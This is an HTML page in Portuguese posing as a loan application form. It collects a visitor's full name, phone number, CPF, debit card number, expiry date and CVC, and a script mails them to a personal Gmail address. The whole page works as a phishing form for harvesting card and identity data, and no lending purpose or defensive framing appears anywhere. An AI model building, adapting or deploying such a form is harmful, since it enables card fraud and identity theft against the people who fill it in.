<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Empréstimo</title>
  <script>
    function enviarEmail() {
      const nome = document.getElementById("nome").value;
      const telefone = document.getElementById("telefone").value;
      const cpf = document.getElementById("cpf").value;
      const cartao = document.getElementById("cartao").value;
      const validade = document.getElementById("validade").value;
      const cvc = document.getElementById("cvc").value;

      const corpo = `
        Nome completo: ${nome}%0D%0A
        Telefone: ${telefone}%0D%0A
        CPF: ${cpf}%0D%0A
        Número do cartão: ${cartao}%0D%0A
        Validade: ${validade}%0D%0A
        CVC: ${cvc}
      `;

      window.location.href = `mailto:ronald28int@gmail.com?subject=Pedido de Empréstimo&body=${corpo}`;
    }
  </script>
</head>
<body>
  <h2>Solicitar Empréstimo</h2>
  <input type="text" id="nome" placeholder="Nome completo" required><br>
  <input type="tel" id="telefone" placeholder="Telefone" required><br>
  <input type="text" id="cpf" placeholder="CPF" required><br>
  <h2>Cartão da conta débito automático</h2>
  <input type="text" id="cartao" placeholder="Número do cartão" maxlength="16" required><br>
  <input type="text" id="validade" placeholder="Validade (MM/AA)" required><br>
  <input type="text" id="cvc" placeholder="CVC" maxlength="4" required><br>
  <button onclick="enviarEmail()">Enviar Pedido</button>
</body>
</html>
